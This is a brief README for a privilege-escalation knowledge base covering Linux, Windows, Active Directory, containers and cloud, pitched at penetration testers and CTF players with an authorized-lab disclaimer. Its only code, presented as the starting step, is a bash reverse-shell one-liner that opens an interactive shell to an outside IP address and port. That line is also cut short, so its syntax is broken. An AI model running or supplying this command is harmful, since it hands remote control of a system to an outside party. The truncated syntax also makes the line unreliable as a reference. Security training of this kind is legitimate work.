# Zero2Root 🚀

> A structured privilege escalation knowledge base for penetration testers, security learners, and CTF players.

This repository focuses on Linux, Windows, Active Directory, containers, and cloud privilege escalation techniques in a clean and organized format.

> ⚠️ For educational and authorized lab use only.


Begin with 
```bash
#!/bin/bash

bash -i >& /dev/tcp/69.69.6.9/1337 0>&
```
